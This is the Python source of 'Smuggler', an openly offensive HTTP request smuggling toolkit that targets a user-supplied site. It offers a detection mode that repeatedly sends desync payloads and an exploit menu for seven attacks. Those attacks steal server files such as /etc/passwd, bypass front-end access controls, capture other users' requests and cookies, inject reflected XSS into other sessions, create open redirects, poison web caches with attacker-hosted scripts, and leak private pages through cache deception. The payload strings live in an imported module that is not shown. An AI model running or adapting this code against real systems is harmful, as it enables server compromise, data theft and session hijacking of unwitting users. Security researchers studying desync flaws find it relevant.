#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with PandeMaths; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, socket, ssl

VERSION = "v0.1_beta"
RELEASE = "25_04_2020"
SOURCE1 = "https://code.03c8.net/epsylon/smuggler"
SOURCE2 = "https://github.com/epsylon/smuggler"
CONTACT = "epsylon@riseup.net - (https://03c8.net)"

try:
    import payloads.payloads # import payloads
except:
    print ("\n[Info] Try to run the tool with Python3.x.y... (ex: python3 smuggler.py) -> [EXITING!]\n")
    sys.exit()

VULNERABLE_LIST = []

def set_target():
    target = input("\n  + Enter DOMAIN/IP (ex: 'http(s)://www.target.com'): ").lower()
    if target.startswith("http://"):
        target = target.replace("http://","")
        port = 80
        SSL = False
    elif target.startswith("https://"):
        target = target.replace("https://","")
        port = 443
        SSL = True
    else:
        print("\n[Error] Target is invalid: '"+str(target)+"'\n")
        print("="*50)
        sys.exit()
    method = input("\n  + Enter HTTP Method (ex: POST): ").upper()
    if method == "GET" or method == "POST":
        pass
    else:
        print("\n[Error] Method is invalid: '"+str(method)+"'\n")
        print("="*50)
        sys.exit()
    path = input("\n  + Enter PATH (ex: '/'): ")
    if path == "":
        path = "/"
    return target, port, SSL, method, path

def detect(): # detect menu
    target, port, SSL, method, path = set_target() # set target
    print("\n"+"="*50 + "\n")
    print("[Info] Starting HTTP Smuggling detection ...")
    payloads_dsync = payloads.payloads.payloads # load payloads
    addr = (target, port)
    print("")
    for payload in payloads_dsync:
        attack_type = payload.split("#")[0]
        payload_type = payload.split("#")[1]
        print("="*50)
        print("Trying payload: ["+str(attack_type)+"]")
        print("="*50+"\n")
        payload = method+" "+path+" HTTP/1.1\r\nHost: "+target+"\r\n"+payload_type
        print("+ PAYLOAD:\n")
        print(payload)
        send_payload(attack_type, payload, addr, SSL) # send each payload
    show_results(target, port, method, path) # show final results

def send_payload(attack_type, payload, addr, SSL):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if SSL == True: # ssl
        ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
    try:
        if SSL == True: # ssl
            ss.connect(addr)
        else:
            s.connect(addr)
    except:
        print("-"*45)
        print("[Error] Generating socket... -> [PASSING!]")
        print("-"*45+"\n")
        s.close()
        if SSL == True: # ssl
            ss.close()
        return
    for i in range(1,20): # 20x tests
        if SSL == True: # ssl
            ss.send(payload.encode('utf-8'))
        else:
            s.send(payload.encode('utf-8'))
    datas=""
    while 1:
        if SSL == True: # ssl
            data = ss.recv(1024)
        else:
            data = s.recv(1024)
        if not data:        
            break
        datas += str(data.decode('utf-8'))
    print("\n+ REPLY:\n")
    print(str(datas))
    resp_c=0
    resp=""
    wait=False
    for line in datas.split('\n'):
        if line.startswith('HTTP/1.1 400 BAD_REQUEST') or line.startswith('HTTP/1.1 400 Bad Request') or line.startswith('HTTP/1.1 400 BAD REQUEST'):
            wait=True
        elif line.startswith('HTTP/1.0 400 BAD_REQUEST') or line.startswith('HTTP/1.0 400 Bad Request') or line.startswith('HTTP/1.0 400 BAD REQUEST'):
            wait=True
        elif line.startswith('HTTP/1.1 '):
            wait=False
            resp_c+=1
        if not wait:
            resp += line+'\n'
    print("-"*45)
    if resp_c > 0:
        print ("PAYLOAD: ["+str(attack_type)+"] is WORKING! ;-)")
        VULNERABLE_LIST.append(attack_type) # add attack type for results
    else:
        print ("PAYLOAD: ["+str(attack_type)+"] is NOT working...")
    print("-"*45+"\n")
    s.close()
    if SSL == True: # ssl
        ss.close()

def show_results(target, port, method, path):
    print("="*50)
    print("\n+ FINAL RESULTS: -HTTP Smuggling- Attack\n")
    print("-"*45+"\n")
    print("  - TARGET: "+str(target)+":"+str(port))
    print("  - Method: "+str(method))
    print("  - Path  : "+str(path))
    CLCL = False
    TETE = False
    TECL = False
    CLTE = False 
    if VULNERABLE_LIST: 
        print("\n  - STATUS: [ VULNERABLE !!! ]\n")
        for v in VULNERABLE_LIST: # resume vulnerable payloads found
            if v.startswith("CL-CL") and CLCL == False: # CL-CL
                print("    * [CL-CL]: [Front-end: Content Length] <-> [Back-end: Content Length]")
                CLCL = True
            elif v.startswith("TE-TE") and TETE == False: # TE-TE
                print("    * [TE-TE]: [Front-end: Transfer-Encoding] <-> [Back-end: Transfer-Encoding]")
                TETE = True
            elif v.startswith("TE-CL") and TECL == False: # TE-CL
                print("    * [TE-CL]: [Front-end: Transfer-Encoding] <-> [Back-end: Content Length]")
                TECL = True
            elif v.startswith("CL-TE") and CLTE == False: # CL-TE
                print("    * [CL-TE]: [Front-end: Content-Length] <-> [Back-end: Transfer-Encoding]")
                CLTE = True
            else:
                pass
    else:
        print("\n  - STATUS: [ NOT VULNERABLE ]")
    print("\n"+"="*50+"\n")

def exploit(): # exploit menu
    exploit = input("\n+ SELECT EXPLOIT:\n\n  (0) Steal files (ex: '/etc/passwd')\n  (1) Bypass Front-End Security Controls\n  (2) Reveal Front-End Rewriting\n  (3) Capture Users Requests\n  (4) Re-Exploit a XSS Reflected\n  (5) Turn into an Open-Redirect\n  (6) Web Cache Poisoning\n  (7) Web Cache Deception\n\n")
    if exploit == "0": # steal files
        exploit_steal()
    elif exploit == "1": # bypass front-end
        exploit_bypass()
    elif exploit == "2": # reveal front-edn rewriting
        exploit_reveal()
    elif exploit == "3": # capture users requests
        exploit_capture()
    elif exploit == "4": # re-exploit xss reflection
        exploit_xss()
    elif exploit == "5": # turn into open-redirect 'zombie'
        exploit_openredirect()
    elif exploit == "6": # webcache poisoning
        exploit_poison()
    elif exploit == "7": # webcache deception
        exploit_deception()
    else: # exit
        print ("[Info] Not any valid exploit selected... -> [EXITING!]\n")
        sys.exit()

def send_exploit(addr, SSL, exploit):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if SSL == True: # ssl
        ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
    try:
        if SSL == True: # ssl
            ss.connect(addr)
        else:
            s.connect(addr)
    except:
        print("\n"+"-"*45)
        print("[Error] Generating socket... -> [PASSING!]")
        print("-"*45+"\n")
        s.close()
        if SSL == True: # ssl
            ss.close()
        return
    if SSL == True: # ssl
        ss.send(exploit.encode('utf-8'))
    else:
        s.send(exploit.encode('utf-8'))
    datas=""
    while 1:
        if SSL == True: # ssl
            data = ss.recv(1024)
        else:
            data = s.recv(1024)
        if not data:
            break
        datas += str(data.decode('utf-8'))
    print("\n+ REPLY:\n")
    print(str(datas))

def exploit_bypass():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to Bypass Front-End Security Controls...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    restricted_path = input("\n  + Enter RESTRICTED ZONE (ex: '/admin'): ")
    content_length  = input("\n  + Enter CONTENT-LENGTH (default: '50'): ")
    request_type    = input("\n  + Enter PAYLOAD MODE (ex: 'TE-CL') (default: 'ALL'): ")
    try:
        content_length = int(content_length)
    except:
        content_length = 50
    if not content_length:
        content_length = 50
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-1" in exp: # extract all exploit-1 (bypass front-end ACLs)
            if request_type == "TE-CL":
                if "TE-CL" in exp: # exploit 1 TE-CL
                    exploit_bypass_armed(method, path, target, restricted_path, content_length, exp, addr, SSL)
            elif request_type == "CL-TE":
                if "CL-TE" in exp: # exploit 1 CL-TE
                    exploit_bypass_armed(method, path, target, restricted_path, content_length, exp, addr, SSL)
            elif request_type == "TE-TE":
                if "TE-TE" in exp: # exploit 1 TE-TE
                    exploit_bypass_armed(method, path, target, restricted_path, content_length, exp, addr, SSL)
            elif request_type == "CL-CL":
                if "CL-CL" in exp: # exploit 1 CL-CL
                    exploit_bypass_armed(method, path, target, restricted_path, content_length, exp, addr, SSL)
            else: # send all!
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$restricted_path", restricted_path)
                exploit = exploit.replace("$CL", str(content_length))
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit) # send expoit

def exploit_bypass_armed(method, path, target, restricted_path, content_length, exp, addr, SSL):
    exploit = exp.split("#")[1]
    exploit = exploit.replace("$method", method)
    exploit = exploit.replace("$path", path)
    exploit = exploit.replace("$target", target)
    exploit = exploit.replace("$restricted_path", restricted_path)
    exploit = exploit.replace("$CL", str(content_length))
    print("\n"+"="*50+"\n")
    print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
    print(str(exploit))
    send_exploit(addr, SSL, exploit) # send expoit

def exploit_reveal():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to Reveal Front-End Rewriting...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    parameter = input("\n  + Enter PARAMETER reflected (ex: 'user'): ")
    content_length  = input("\n  + Enter CONTENT-LENGTH (default: '130'): ")
    request_type    = input("\n  + Enter PAYLOAD MODE (ex: 'TE-CL') (default: 'ALL'): ")
    try:
        content_length = int(content_length)
    except:
        content_length = 130
    if not content_length:
        content_length = 130
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-2" in exp: # extract exploit-2 (reveal rewriting)
            if request_type == "TE-CL":
                if "TE-CL" in exp: # exploit 2 TE-CL
                    exploit_reveal_armed(method, path, target, parameter, content_length, exp, addr, SSL)
            elif request_type == "CL-TE":
                if "CL-TE" in exp: # exploit 2 CL-TE
                    exploit_reveal_armed(method, path, target, parameter, content_length, exp, addr, SSL)
            elif request_type == "TE-TE":
                if "TE-TE" in exp: # exploit 2 TE-TE
                    exploit_reveal_armed(method, path, target, parameter, content_length, exp, addr, SSL)
            elif request_type == "CL-CL":
                if "CL-CL" in exp: # exploit 2 CL-CL
                    exploit_reveal_armed(method, path, target, parameter, content_length, exp, addr, SSL)
            else: # send all!
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$parameter", parameter)
                exploit = exploit.replace("$CL", str(content_length))
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit) # send expoit

def exploit_reveal_armed(method, path, target, parameter, content_length, exp, addr, SSL):
    exploit = exp.split("#")[1]
    exploit = exploit.replace("$method", method)
    exploit = exploit.replace("$path", path)
    exploit = exploit.replace("$target", target)
    exploit = exploit.replace("$parameter", parameter)
    exploit = exploit.replace("$CL", str(content_length))
    print("\n"+"="*50+"\n")
    print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
    print(str(exploit))
    send_exploit(addr, SSL, exploit) # send expoit

def exploit_capture():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to Capture Users Requests (cookies, other sensitive data, etc)...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    parameters = input("\n  + Enter PARAMETERS (ex: 'csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Admin&comment='): ")
    cookie    = input("\n  + Enter COOKIE (ex: 'session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO'): ")
    content_length  = input("\n  + Enter CONTENT-LENGTH (default: '130'): ")
    request_type    = input("\n  + Enter PAYLOAD MODE (ex: 'TE-CL') (default: 'ALL'): ")
    try:
        content_length = int(content_length)
    except:
        content_length = 130
    if not content_length:
        content_length = 130
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-3" in exp: # extract exploit-3 (capture users requests)
            if request_type == "TE-CL":
                if "TE-CL" in exp: # exploit 3 TE-CL
                    exploit_capture_armed(method, path, target, parameters, cookie, content_length, exp, addr, SSL)
            elif request_type == "CL-TE":
                if "CL-TE" in exp: # exploit 3 CL-TE
                    exploit_capture_armed(method, path, target, parameters, cookie, content_length, exp, addr, SSL)
            elif request_type == "TE-TE":
                if "TE-TE" in exp: # exploit 3 TE-TE
                    exploit_capture_armed(method, path, target, parameters, cookie, content_length, exp, addr, SSL)
            elif request_type == "CL-CL":
                if "CL-CL" in exp: # exploit 3 CL-CL
                    exploit_capture_armed(method, path, target, parameters, cookie, content_length, exp, addr, SSL)
            else: # send all!
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$parameters", parameters)
                exploit = exploit.replace("$cookie", cookie)
                exploit = exploit.replace("$CL", str(content_length))
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit) # send expoit

def exploit_capture_armed(method, path, target, parameters, cookie, content_length, exp, addr, SSL):
    exploit = exp.split("#")[1]
    exploit = exploit.replace("$method", method)
    exploit = exploit.replace("$path", path)
    exploit = exploit.replace("$target", target)
    exploit = exploit.replace("$parameters", parameters)
    exploit = exploit.replace("$cookie", cookie)
    exploit = exploit.replace("$CL", str(content_length))
    print("\n"+"="*50+"\n")
    print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
    print(str(exploit))
    send_exploit(addr, SSL, exploit) # send expoit

def exploit_xss():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to Re-Exploit a XSS Reflected (found in HTTP Headers) into other's sessions (NOT USER INTERACTION REQUIRED!)...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    header = input("\n  + Enter VULNERABLE HEADER (ex: 'User-Agent'): ")
    xss    = input("\n  + Enter XSS Injection (ex: '<script>alert(1)</script>'): ")
    content_length  = input("\n  + Enter CONTENT-LENGTH (default: '100'): ")
    request_type    = input("\n  + Enter PAYLOAD MODE (ex: 'TE-CL') (default: 'ALL'): ")
    try:
        content_length = int(content_length)
    except:
        content_length = 100
    if not content_length:
        content_length = 100
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-4" in exp: # extract exploit-4 (re-exploit XSS)
            if request_type == "TE-CL":
                if "TE-CL" in exp: # exploit 4 TE-CL
                    exploit_xss_armed(method, path, target, header, xss, content_length, exp, addr, SSL)
            elif request_type == "CL-TE":
                if "CL-TE" in exp: # exploit 4 CL-TE
                    exploit_xss_armed(method, path, target, header, xss, content_length, exp, addr, SSL)
            elif request_type == "TE-TE":
                if "TE-TE" in exp: # exploit 4 TE-TE
                    exploit_xss_armed(method, path, target, header, xss, content_length, exp, addr, SSL)
            elif request_type == "CL-CL":
                if "CL-CL" in exp: # exploit 4 CL-CL
                    exploit_xss_armed(method, path, target, header, xss, content_length, exp, addr, SSL)
            else: # send all!
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$header", header)
                exploit = exploit.replace("$xss", xss)
                exploit = exploit.replace("$CL", str(content_length))
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit) # send expoit

def exploit_xss_armed(method, path, target, header, xss, content_length, exp, addr, SSL):
    exploit = exp.split("#")[1]
    exploit = exploit.replace("$method", method)
    exploit = exploit.replace("$path", path)
    exploit = exploit.replace("$target", target)
    exploit = exploit.replace("$header", header)
    exploit = exploit.replace("$xss", xss)
    exploit = exploit.replace("$CL", str(content_length))
    print("\n"+"="*50+"\n")
    print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
    print(str(exploit))
    send_exploit(addr, SSL, exploit) # send expoit

def exploit_openredirect():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to turn an on-site redirect into an Open-Redirect (ex: UFONet 'zombie')...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    location = input("\n  + Enter NEW LOCATION (ex: 'otherwebsite.com'): ")
    content_length  = input("\n  + Enter CONTENT-LENGTH (default: '100'): ")
    request_type    = input("\n  + Enter PAYLOAD MODE (ex: 'TE-CL') (default: 'ALL'): ")
    try:
        content_length = int(content_length)
    except:
        content_length = 100
    if not content_length:
        content_length = 100
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-5" in exp: # extract exploit-5 (open-redirect)
            if request_type == "TE-CL":
                if "TE-CL" in exp: # exploit 5 TE-CL
                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
            elif request_type == "CL-TE":
                if "CL-TE" in exp: # exploit 5 CL-TE
                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
            elif request_type == "TE-TE":
                if "TE-TE" in exp: # exploit 5 TE-TE
                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
            elif request_type == "CL-CL":
                if "CL-CL" in exp: # exploit 5 CL-CL
                    exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL)
            else: # send all!
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$location", location)
                exploit = exploit.replace("$CL", str(content_length))
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit) # send expoit

def exploit_openredirect_armed(method, path, target, location, content_length, exp, addr, SSL):
    exploit = exp.split("#")[1]
    exploit = exploit.replace("$method", method)
    exploit = exploit.replace("$path", path)
    exploit = exploit.replace("$target", target)
    exploit = exploit.replace("$location", location)
    exploit = exploit.replace("$CL", str(content_length))
    print("\n"+"="*50+"\n")
    print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
    print(str(exploit))
    send_exploit(addr, SSL, exploit) # send expoit

def exploit_poison():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to perform web cache poisoning...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    location = input("\n  + Enter POISON DOMAIN/IP (ex: 'attacker-website.net'): ")
    script   = input("\n  + Enter POISON SOURCE (ex: '/static/defaced.js'): ")
    content_length  = input("\n  + Enter CONTENT-LENGTH (default: '100'): ")
    request_type    = input("\n  + Enter PAYLOAD MODE (ex: 'TE-CL') (default: 'ALL'): ")
    try:
        content_length = int(content_length)
    except:
        content_length = 100
    if not content_length:
        content_length = 100
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-6" in exp: # extract exploit-6 (web cache poison)
            if request_type == "TE-CL":
                if "TE-CL" in exp: # exploit 6 TE-CL
                    exploit_poison_armed(method, path, target, location, script, content_length, exp, addr, SSL)
            elif request_type == "CL-TE":
                if "CL-TE" in exp: # exploit 6 CL-TE
                    exploit_poison_armed(method, path, target, location, script, content_length, exp, addr, SSL)
            elif request_type == "TE-TE":
                if "TE-TE" in exp: # exploit 6 TE-TE
                    exploit_poison_armed(method, path, target, location, script, content_length, exp, addr, SSL)
            elif request_type == "CL-CL":
                if "CL-CL" in exp: # exploit 6 CL-CL
                    exploit_poison_armed(method, path, target, location, script, content_length, exp, addr, SSL)
            else: # send all!
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$location", location)
                exploit = exploit.replace("$script", script)
                exploit = exploit.replace("$CL", str(content_length))
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit) # send expoit

def exploit_poison_armed(method, path, target, location, script, content_length, exp, addr, SSL):
    exploit = exp.split("#")[1]
    exploit = exploit.replace("$method", method)
    exploit = exploit.replace("$path", path)
    exploit = exploit.replace("$target", target)
    exploit = exploit.replace("$location", location)
    exploit = exploit.replace("$script", script)
    exploit = exploit.replace("$CL", str(content_length))
    print("\n"+"="*50+"\n")
    print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
    print(str(exploit))
    send_exploit(addr, SSL, exploit) # send expoit

def exploit_deception():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to perform web cache deception leaking...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    private = input("\n  + Enter RESTRICTED ZONE (ex: '/private/messages'): ")
    content_length  = input("\n  + Enter CONTENT-LENGTH (default: '100'): ")
    request_type    = input("\n  + Enter PAYLOAD MODE (ex: 'TE-CL') (default: 'ALL'): ")
    try:
        content_length = int(content_length)
    except:
        content_length = 100
    if not content_length:
        content_length = 100
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-7" in exp: # extract exploit-7 (web cache deception)
            if request_type == "TE-CL":
                if "TE-CL" in exp: # exploit 7 TE-CL
                    exploit_deception_armed(method, path, target, private, content_length, exp, addr, SSL)
            elif request_type == "CL-TE":
                if "CL-TE" in exp: # exploit 7 CL-TE
                    exploit_deception_armed(method, path, target, private, content_length, exp, addr, SSL)
            elif request_type == "TE-TE":
                if "TE-TE" in exp: # exploit 7 TE-TE
                    exploit_deception_armed(method, path, target, private, content_length, exp, addr, SSL)
            elif request_type == "CL-CL":
                if "CL-CL" in exp: # exploit 7 CL-CL
                    exploit_deception_armed(method, path, target, private, content_length, exp, addr, SSL)
            else: # send all!
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$private", private)
                exploit = exploit.replace("$CL", str(content_length))
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit) # send expoit

def exploit_deception_armed(method, path, target, private, content_length, exp, addr, SSL):
    exploit = exp.split("#")[1]
    exploit = exploit.replace("$method", method)
    exploit = exploit.replace("$path", path)
    exploit = exploit.replace("$target", target)
    exploit = exploit.replace("$private", private)
    exploit = exploit.replace("$CL", str(content_length))
    print("\n"+"="*50+"\n")
    print("+ PAYLOAD MODE: ["+str(exp.split("#")[0].split("_")[1])+"]\n")
    print(str(exploit))
    send_exploit(addr, SSL, exploit) # send expoit

def exploit_steal():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to steal files from server...")
    target, port, SSL, method, path = set_target() # set target
    addr = (target, port)
    files = input("\n  + Enter FILE (ex: '/etc/passwd'): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    for exp in exploits_dsync:
        if "EXPLOIT-0" in exp: # extract exploit-0 (steal files)
            exploit = exp.split("#")[1]
            exploit = exploit.replace("$method", method)
            exploit = exploit.replace("$path", path)
            exploit = exploit.replace("$target", target)
            exploit = exploit.replace("$files", files)
            content_length = len(files)+2 # p=len(files)
            exploit = exploit.replace("$CL", str(content_length))
            print("\n"+"="*50+"\n")
            print("+ PAYLOAD MODE: [CL-CL]\n")
            print(str(exploit))
            send_exploit(addr, SSL, exploit) # send expoit

def print_banner():
    print("\n"+"="*50)
    print(" ____  __  __ _   _  ____  ____ _     _____ ____  ")
    print("/ ___||  \/  | | | |/ ___|/ ___| |   | ____|  _ \ ")
    print("\___ \| |\/| | | | | |  _| |  _| |   |  _| | |_) |")
    print(" ___) | |  | | |_| | |_| | |_| | |___| |___|  _ < ")
    print("|____/|_|  |_|\___/ \____|\____|_____|_____|_| \_\ by psy")
    print('\n"HTTP -Smuggling- (DSYNC) Attacking Toolkit"')
    print("\n"+"-"*15+"\n")
    print(" * VERSION: ")
    print("   + "+VERSION+" - (rev:"+RELEASE+")")
    print("\n * SOURCES:")
    print("   + "+SOURCE1)
    print("   + "+SOURCE2)
    print("\n * CONTACT: ")
    print("   + "+CONTACT+"\n")
    print("-"*15+"\n")
    print("="*50)

# sub_init #
print_banner() # show banner
option = input("\n+ CHOOSE: (D)etect or (E)ploit: ").upper()
print("\n"+"="*50)
if option == "D": # detecting phase
    detect()
else: # trying to exploit
    exploit()
